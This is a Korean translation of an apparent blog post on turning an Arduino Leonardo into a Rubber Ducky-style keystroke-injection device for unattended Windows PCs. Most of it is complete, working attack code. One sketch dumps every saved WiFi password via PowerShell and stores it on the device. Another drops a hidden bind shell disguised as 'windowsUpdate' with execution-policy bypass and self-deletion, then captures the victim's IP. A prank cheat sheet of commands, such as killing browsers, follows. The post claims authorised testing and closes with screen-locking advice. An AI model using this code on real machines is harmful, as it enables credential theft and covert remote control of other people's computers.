---
title: "아두이노로 컴퓨터 해킹하는 방법"
description: ""
coverImage: "/assets/img/2024-06-22-HackingacomputerusingArduino_0.png"
date: 2024-06-22 18:52
ogImage: 
  url: /assets/img/2024-06-22-HackingacomputerusingArduino_0.png
tag: Tech
originalTitle: "Hacking a computer using Arduino"
link: "https://medium.com/csg-govtech/hacking-a-computer-using-arduino-8f0ddddab7e1"
---


상상해보세요...

이미지를 보셨죠! 이 글에서 나는 어떤 사람이 화장실에 간 동안 무단 침입한 미해금 컴퓨터에 잠입하는 방법을 설명할 겁니다. [주의: 컴퓨터 해킹 전 해당 사람으로부터 허가를 받았으며, 해킹이 완료된 후 컴퓨터를 원래 상태로 복원했습니다] 다만, 그 정도 시간 안에 할 수 있는 일에는 한계가 있었죠. 해킹 과정을 가속화하기 위해 나는 아두이노를 사용해 나만의 Rubber Ducky USB를 만들었습니다.

# 아두이노 소개

아두이노는 C 프로그래밍 언어를 사용하여 하드웨어 장치를 제어할 수 있게 해주는 마이크로 컨트롤러 및 마이크로 컨트롤러 키트입니다. 아두이노에는 각각 고유한 특성을 가진 여러 종류가 있습니다. 예를 들어, 아두이노 우노는 가격이 저렵하고 기본 기능 세트를 갖춰 가장 인기 있는 아두이노 보드로 간주됩니다.

<div class="content-ad"></div>

이 글은 ATmega32u4를 기반으로 한 마이크로 컨트롤러 보드인 Arduino Leonardo에 초점을 맞추고 있습니다. 내장 USB 통신을 갖추고 있어 컴퓨터에 연결된 키보드 또는 마우스처럼 위장할 수 있습니다. 다른 Arduino 제품인 Nano와 Uno도 사용해 봤지만, 컴퓨터를 속일 수 없었어요.

![이미지](/assets/img/2024-06-22-HackingacomputerusingArduino_0.png)

이 데모에서는 특정 기능을 수행하는 두 개의 버튼을 설정했습니다. 왼쪽 버튼은 "위장" 기능을 트리거하고 동시에 놀라울 정도로 빠른 속도로 키를 입력하고 데이터를 캡처합니다. 오른쪽 버튼은 공격에 사용하는 컴퓨터로 캡처한 데이터를 내보내는 역할을 합니다.

먼저, Arduino Leonardo의 하드웨어 구성 요소를 소개하고 마이크로 컨트롤러 및 마이크로 컨트롤러 키트에서 기본 Arduino 제어기능을 시연해 보겠습니다.

<div class="content-ad"></div>

아두이노 보드는 모두 setup 함수와 loop 함수로 구성되어 있어요.

## Setup 함수

이 함수는 아두이노가 전원이 켜질 때 한 번만 실행돼요.

## Loop 함수

<div class="content-ad"></div>

이 기능은 설정 함수를 실행하면 계속 실행됩니다.

![이미지](/assets/img/2024-06-22-HackingacomputerusingArduino_1.png)

회로 기판(왼쪽) 다이어그램에서 버튼이 각각 핀 2와 핀 3에 연결되어 있음을 알았습니다. 따라서 스케치(오른쪽)에서 pinMode(2, INPUT); 및 pinMode(3, INPUT);를 각각 입력 구성 요소로 정의했습니다. loop 함수는 우리 함수의 실행을 정의한 곳입니다.

# 공격 1: WiFi 비밀번호 도용

<div class="content-ad"></div>

컴퓨터가 WiFi에 연결될 때마다 WiFi 비밀번호가 시스템에 저장됩니다. 이 좋은 소식은 PowerShell 명령을 활용하여 WiFi 서비스 세트 식별자(SSID)와 비밀번호 목록을 얻을 수 있다는 것입니다.

```js
#include <Keyboard.h>
#include <EEPROM.h>
char stringArray[500] = {""};
boolean extracted = false, dispatched = false;
int extractButton = 2, dispatchButton = 3;

void setup() {    
    Serial.begin(9600);
    pinMode(extractButton, INPUT);
    pinMode(dispatchButton, INPUT);
    Keyboard.begin();
}
void loop() {
    if(digitalRead(extractButton) == HIGH && !extracted) {
        extractingData();
        extracted = true;
    }
    if(digitalRead(dispatchButton) == HIGH && !dispatched) {
        dispatchingData();
        dispatched = true;
    }    
    if(digitalRead(extractButton) == LOW)
        extracted = false;
    if(digitalRead(dispatchButton) == LOW)
        dispatched = false;
}

void extractingData() {
    delay(1000);
    Keyboard.press(KEY_LEFT_GUI);
    delay(20);
    Keyboard.release(KEY_LEFT_GUI);
    delay(500);
    Keyboard.print("Powershell");
    delay(500);
    Keyboard.press(KEY_RETURN);
    delay(200);
    Keyboard.release(KEY_RETURN);
    delay(1000);
    Keyboard.println("(netsh wlan show profiles) | Select-String \"\\:(.+)$\" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=\"$name\" key=clear)}  | Select-String \"Key Content\\W+\\:(.+)$\" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass } | Format-Table -AutoSize | Out-String -OutVariable dataCaptured");
    delay(500);

    Keyboard.println("$comPort = ((Get-WmiObject -query \"SELECT * FROM Win32_PnPEntity\" | Where {$_.Name -Match \"COM\\d+\"}).name).Split(\"COM\")");
    delay(200);
    Keyboard.println("$comPort = [int]$comPort[$comPort.length - 1].replace(\")\", \"\")");
    delay(200);
    Keyboard.print("$serialObject = new-Object System.IO.Ports.SerialPort COM");
    Keyboard.print("$comPort");
    Keyboard.println(", 9600, None, 8, one");
    delay(200);
    Keyboard.println("$serialObject.Open()");
    delay(200);
    Keyboard.println("$serialObject.Write(\"$dataCaptured\")");
    delay(200);
    Keyboard.println("$serialObject.close()");
    delay(200);
    Keyboard.println("exit");
    delay(200);
    for(int i=0; i<sizeof(stringArray)-1; i++)
        stringArray[i] = Serial.read();
    EEPROM.put(1, stringArray);
}

void dispatchingData() {
    delay(500);
    Keyboard.press(KEY_LEFT_GUI);
    delay(20);
    Keyboard.release(KEY_LEFT_GUI);
    delay(500);
    Keyboard.println("notepad");
    delay(700);
    Keyboard.press(KEY_RETURN);
    delay(200);
    Keyboard.release(KEY_RETURN);
    delay(1000);
    Keyboard.print(EEPROM.get(1, stringArray));
}
```

# 공격 요약

- 먼저 Arduino Leonardo를 트롤하는 컴퓨터에 USB 포트를 통해 연결합니다. 앞서 언급한 두 개의 버튼을 기억하시나요? 왼쪽 버튼을 누르면 프로그램이 PowerShell 터미널을 시작하고 명령을 입력하기 시작합니다.
- 프로그램은 WiFi의 SSID와 비밀번호를 추출하여 Arduino의 전기적으로 지워지지 않는 프로그램 가능 읽기 전용 메모리(EEPROM)에 저장합니다. 비휘발성 플래시 메모리 장치이므로 저장된 정보는 더 이상 전원이 공급되지 않아도 유지됩니다.
- Arduino가 기능을 실행한 후에는 피해자 컴퓨터에서 이를 분리하고 제 컴퓨터에 연결합니다. 이번에는 EEPROM에 저장된 데이터를 Arduino가 내 컴퓨터로 덤프하는 오른쪽 버튼을 누릅니다.

<div class="content-ad"></div>

# WiFi SSID 표시 명령어

```js
(netsh wlan show profiles) |
Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} |
%{(netsh wlan show profile name="$name" key=clear)} |
Select-String "Key Content\W+\:(.+)$" |
%{$pass=$_.Matches.Groups[1].Value.Trim(); $_} |
%{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass } |
Format-Table –AutoSize |
Out-String -OutVariable dataCaptured
```

<img src="/assets/img/2024-06-22-HackingacomputerusingArduino_2.png" />

WiFi SSID 표시 명령어가 길고 이해하기 어렵습니다. 이 글의 다음 부분에서는 명령어를 몇 가지 소화 가능한 섹션으로 나눠 코드의 기능을 이해하기 쉽게 설명하겠습니다.

<div class="content-ad"></div>

# 명령어 이해하기

## 섹션 A

이 명령어 섹션은 캐시된 SSID를 표시하고 ":(.+$" 문자열을 정규 표현식으로 필터링합니다.

```js
(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim();
```

<div class="content-ad"></div>

<img src="/assets/img/2024-06-22-HackingacomputerusingArduino_3.png" />

## 섹션 B

```js
%{(netsh wlan show profile name="$name" key=clear)}
```

이전 파이프에서 검색한 $name 변수를 사용했음을 주의하세요. netsh wlan 함수를 다시 호출하여 SSID에 대한 추가 정보를 얻습니다.

<div class="content-ad"></div>

<img src="/assets/img/2024-06-22-HackingacomputerusingArduino_4.png" />

## 섹션 C

여기서 Key Content(비밀번호)를 추출하여 $pass 변수에 할당합니다.

```js
Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_}
```

<div class="content-ad"></div>

## 섹션 D

마지막으로, 프로필 이름과 비밀번호 속성을 포함한 PS 객체를 생성하고 테이블 형식으로 표시하여 $dataCaptured에 작성합니다.

```js
%{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass } | Format-Table –AutoSize | Out-String -OutVariable dataCaptured
```

# EEPROM에 데이터 저장하는 명령

<div class="content-ad"></div>

아두이노에 데이터를 기록하려면 컴퓨터와 아두이노는 직렬 통신을 사용하여 상호 작용해야 합니다. 직렬 통신은 통신 채널 또는 USB를 통해 한 번에 한 비트씩 데이터를 전송하는 프로세스입니다. 각 포트는 COM1, COM2, COM3, COM4 등으로 식별됩니다. 각 COM은 입출력(I/O) 및 인터럽트 요청(IRQ) 주소를 나타냅니다. I/O 주소는 마우스나 키보드와 같은 주변 장치와 데이터를 전송하고 수신합니다. 직렬 통신의 속도 또는 '보드 속도'는 초당 비트로 측정됩니다. 이 데모에서는 9600비트 초당을 사용했습니다.

```bash
# 사용 가능한 COM 포트 검색
$comPort = ((Get-WmiObject -query "SELECT * FROM Win32_PnPEntity" | Where {$_.Name -Match "COM\d+"}).name).Split("COM");
$comPort = [int]$comPort[$comPort.length - 1].replace(")", "");

# COM 포트에 연결하여 데이터 기록 시작
$serialObject = new-Object System.IO.Ports.SerialPort COM$comPort , 9600, None, 8, one;
$serialObject.Open();
$serialObject.Write("$dataCaptured");
```

데이터를 전송한 후, 아두이노를 피해자의 컴퓨터에서 분리하여 내 컴퓨터에 연결합니다. 그런 다음, 캡처된 데이터를 제 노트패드로 전송하는 배송 프로세스를 시작하려면 오른쪽 버튼을 트리거합니다.

![이미지](/assets/img/2024-06-22-HackingacomputerusingArduino_5.png)

<div class="content-ad"></div>

# 공격 2: 쉘 열기

여기서 여러분은 아마 생각하고 있을거에요: 우리 피해자의 WiFi SSID와 비밀번호를 훔치는 것에 그치지 말고 더 많은 정보를 얻을 수는 없을까요? 이 섹션에서는 쉘을 열어보는 방법을 보여드릴게요.

```js
#include <Keyboard.h>
#include <EEPROM.h>

char stringArray[50] = {""};
boolean extracted = false, dispatched = false;
int extractButton = 2, dispatchButton = 3;
void setup() {
    Serial.begin(9600);
    pinMode(extractButton, INPUT);
    pinMode(dispatchButton, INPUT);
    Keyboard.begin();
}
void loop() {
    if(digitalRead(extractButton) == HIGH && !extracted) {
        shell();
        extracted = true;
    }
    if(digitalRead(dispatchButton) == HIGH && !dispatched) {
        ipaddr();
        dispatched = true;
    }
    if(digitalRead(extractButton) == LOW)
        extracted = false;
    if(digitalRead(dispatchButton) == LOW)
        dispatched = false;
}

void shell() {
    delay(1000);
    Keyboard.press(KEY_LEFT_GUI);
    delay(20);
    Keyboard.release(KEY_LEFT_GUI);
    delay(500);
    Keyboard.print("cmd");
    delay(500);
    Keyboard.press(KEY_RETURN);
    delay(200);
    Keyboard.release(KEY_RETURN);
    delay(1000);
    Keyboard.println("set updateSource=\"function windowsUpdate{$stream=$client.GetStream();[byte[]]$bytes=0..65535^|^%{0};$sendbytes=([text.encoding]::ASCII).GetBytes('Running as user '+$env:username+' on '+$env:computername+'.');$stream.Write($sendbytes,0,$sendbytes.Length);$sendbytes=([text.encoding]::ASCII).GetBytes('PS '+(Get-Location).Path+'^>');$stream.Write($sendbytes,0,$sendbytes.Length);while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){$EncodedText=New-Object -TypeName System.Text.ASCIIEncoding;$data=$EncodedText.GetString($bytes,0,$i);try{$sendback=(IEX -Command $data 2^>^&1 ^| Out-String );}catch{}$sendback2  = $sendback + 'PS ' + (Get-Location).Path + '^> ';$x = ($error[0] ^|Out^-String);$error.clear();$sendback2 = $sendback2 + $x;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush();}$client.Close();if($listener){$listener.Stop();}$listener=[System.Net.Sockets.TcpListener]5566;$listener.start();rm update.ps1;$client=$listener.AcceptTcpClient();windowsUpdate\"");
    delay(500);

    Keyboard.println("echo %updateSource:~1,1014%>update.ps1");
    delay(200);
    Keyboard.println("powershell -ep bypass -windowstyle hidden -file update.ps1");
    delay(500);

    Keyboard.press(KEY_LEFT_GUI);
    delay(20);
    Keyboard.release(KEY_LEFT_GUI);
    delay(500);
    Keyboard.print("Powershell");
    delay(500);
    Keyboard.press(KEY_RETURN);
    delay(200);
    Keyboard.release(KEY_RETURN);
    delay(1000);
    Keyboard.println("Get-NetIPAddress -AddressFamily IPv4 -suffixorigin dhcp|select ipaddress|Out-String -OutVariable d");
    delay(200);
    Keyboard.println("$c=((Get-WmiObject -query \"SELECT * FROM Win32_PnPEntity\"|Where{$_.Name -Match \"COM\\d+\"}).name).Split(\"COM\")");
    delay(200);
    Keyboard.println("$c=[int]$c[$c.length-1].replace(\")\",\"\")");
    delay(200);
    Keyboard.print("$s=new-Object System.IO.Ports.SerialPort COM");
    Keyboard.print("$c");
    Keyboard.println(",9600,None,8,one");
    delay(200);
    Keyboard.println("$s.Open()");
    delay(200);
    Keyboard.println("$s.Write(\"$d\")");
    delay(200);
    Keyboard.println("$s.close()");
    delay(200);
    Keyboard.println("exit");
    delay(200);

    for(int i=0; i<sizeof(stringArray)-1; i++)
        stringArray[i] = Serial.read();

    EEPROM.put(1, stringArray);
}
void ipaddr() {
    delay(500);
    Keyboard.press(KEY_LEFT_GUI);
    delay(20);
    Keyboard.release(KEY_LEFT_GUI);
    delay(500);
    Keyboard.println("notepad");
    delay(700);
    Keyboard.press(KEY_RETURN);
    delay(200);
    Keyboard.release(KEY_RETURN);
    delay(1000);
    Keyboard.print(EEPROM.get(1, stringArray));
}
```

위의 코드는 복잡해 보일 수 있으니, 단계별로 살펴보도록 하죠:

<div class="content-ad"></div>

- 아두이노를 피해자 컴퓨터에 연결한 후 왼쪽 버튼을 누르면, 프로그램이 명령 프롬프트를 실행하고, 거기에 PowerShell 쉘 코드를 저장하는 updateSource라는 명령 프롬프트 변수를 생성합니다.
- 그 후에 프로그램은 updateSource의 값이 기록된 PowerShell 스크립트 update.ps1을 생성합니다.
- 마지막으로 프로그램은 명령 프롬프트 코드 powershell -ep bypass -windowstyle hidden -file update.ps1을 실행합니다. 이로써 update.ps1 프로그램이 백그라운드에서 실행됨을 보장합니다.
- Exploit을 마치기 전에, 프로그램은 다시 PowerShell을 실행하고 피해자의 IP 주소를 EEPROM에 기록합니다. 이것은 이전에 설명한 WiFi 암호를 전송하는 것과 유사합니다.
- 아두이노를 피해자 컴퓨터에서 분리한 후 내 컴퓨터에 연결합니다. 이번에는 오른쪽 버튼을 눌러 피해자의 IP 주소를 언로드합니다.
- bind shell을 설정하기 위해 netcat 연결을 수립하여 공격을 완료합니다.

아래는 정리된 셸 코드 버전입니다:

```js
# 쉘 기능 정의
function windowsUpdate {
  $stream = $client.GetStream();
  [byte[]]$bytes = 0..65535 | %{0};
  $sendbytes = ([text.encoding]::ASCII).GetBytes('Running as user '+$env:username+' on '+$env:computername+'.');
  $stream.Write($sendbytes, 0, $sendbytes.Length);
  $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>');
  $stream.Write($sendbytes, 0, $sendbytes.Length);
  while (($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0) {
    $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding;
    $data = $EncodedText.GetString($bytes,0,$i);
    
    try {
      # 공격자로부터 명령 수신
      $sendback=(IEX -Command $data 2 >&1 | Out-String );
    }
    catch {}
    $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> ';
    $x = ($error[0] | Out-String);
    $error.clear();
    $sendback2 = $sendback2 + $x;
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte, 0, $sendbyte.Length);
    $stream.Flush();
  }
  $client.Close();
  if ($listener) {
    $listener.Stop();
  }
}

# 연결 대기
$listener = [System.Net.Sockets.TcpListener] 5566;
$listener.start();

# 여기서 update.ps1 제거!
rm update.ps1;

$client = $listener.AcceptTcpClient();

# 함수 호출
windowsUpdate;
```

요약하면, 이 프로그램은 접속한 사람이 사용할 수 있는 포트 5566에서 bind shell을 구축하는 기능을 만들었습니다. 프로그램은 들어오는 연결을 기다리면서 update.ps1 파일을 삭제합니다. 이 시점에서 저는 bind shell 함수에 연결하여 피해자의 컴퓨터를 제어하기 시작합니다. PowerShell 스크립팅이 이렇게 간단한 것이죠?

<div class="content-ad"></div>

# 데모 타임

여기 데모에 대한 몇 가지 흥미로운 비디오가 있어요:

- 피해자에게 셸 코드 삽입하고 IP 주소 추출하기
- IP 주소 송부 및 피해자 컴퓨터 제어하기

<div class="content-ad"></div>

우리의 알지 못하는 희생자들에게 소식을 전하는 여러 가지 방법이 있습니다. 여러분이 할 수 있는 일들에 대한 치트 시트입니다:

```js
// 피해자의 컴퓨터로 키 입력 보내기
$wshell = New-Object -ComObject wscript.shell;
$wshell.sendKeys(" ");
$wshell.sendKeys("Hahaha");

// 파일에 쓰기
echo You have been hacked! > hacked.txt

// 메모장으로 파일 열기
notepad hacked.txt


// 브라우저 닫기
taskkill /IM firefox.exe /F
taskkill /IM chrome.exe /F

// Firefox를 위한 URL을 열기
cd "C:\Program Files\Mozilla Firefox"
firefox.exe https://www.google.com/

// Chrome을 위한 URL을 열기
cd "경로\Chrome"
chrome.exe https://www.google.com/
```

# 요약

이 글에서는 아두이노의 기본 기능과 EEPROM, 시리얼 통신, USB Rubber Ducky, 그리고 PowerShell 스크립팅을 소개했습니다.

해킹 프로세스가 백그라운드에서 실행되기 때문에 희생자들은 자신의 컴퓨터가 해킹당했는지 감지할 수 없을 것입니다. 컴퓨터가 해킹당하는 잠재적 위험을 줄이기 위해 — 내 친애하는 동료들도 포함하여 — 책상을 비울 때 컴퓨터를 잠그는 것을 항상 기억해 주세요.

<div class="content-ad"></div>

안녕하세요! 사이버 보안은 여러분부터 시작됩니다!

참고 자료: